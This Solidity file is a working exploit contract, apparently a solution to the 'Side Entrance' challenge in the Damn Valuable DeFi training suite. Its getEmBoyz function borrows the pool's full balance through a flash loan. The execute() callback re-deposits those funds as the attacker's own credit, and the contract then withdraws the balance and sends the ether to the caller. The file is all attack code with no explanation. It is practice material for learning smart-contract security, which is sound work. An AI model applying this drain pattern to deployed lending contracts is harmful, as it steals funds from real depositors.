// SPDX-License-Identifier: UNLICENSED

pragma solidity ^0.8.0;

import "./SideEntranceLenderPool.sol";
import "../DamnValuableToken.sol";

contract Attack_SideEntrance {

    address owner;

    function getEmBoyz(address _pool) public
    {
        SideEntranceLenderPool(_pool).flashLoan(_pool.balance);
        SideEntranceLenderPool(_pool).withdraw();
        msg.sender.call{value: address(this).balance}("");
    }

    function execute() external payable
    {
        SideEntranceLenderPool(msg.sender).deposit{value: msg.value}();
    } 

    receive() external payable
    {
        
    }  
}